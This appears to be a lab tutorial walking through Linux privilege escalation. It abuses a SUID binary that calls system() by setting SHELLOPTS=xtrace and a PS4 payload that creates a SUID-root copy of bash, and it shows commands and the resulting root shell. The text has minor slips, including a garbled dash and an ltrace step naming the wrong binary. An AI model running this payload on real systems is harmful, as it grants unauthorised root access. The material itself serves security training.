Bash has a debugging mode which can be enabled with the â€“x command line option, or by modifying the SHELLOPTS environment variable to include xtrace.

By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.

If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.

If an SUID file is being executed, this command will execute with the privileges of the file owner.

In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.

1. Find SUID/SGID files on the target:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

-rwsr-sr-x 1 root staff 6899 May 14 2017 /usr/local/bin/suid-env2

The suid- - env2 file should execute with root user permissions.

2. Run strings on the SUID file:

```bash
strings /usr/local/bin/suid-env2
```

/usr/sbin/service apache2 start

The file could be trying to run the /usr/sbin/service program.

3. We can verify this with strace:

```bash
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
```

[pid 16729] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"]

4. Optionally, we can also verify with ltrace:

```bash
ltrace /usr/local/bin/suid-env 2>&1 | grep service
```

system("service apache2 start"

This reveals that the system function is being used to execute the service program.

5. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

6. Run the /tmp/rootbash file with the -p command line option to get a root shell:

```bash
/tmp/rootbash -p
```

```bash
id
```

uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
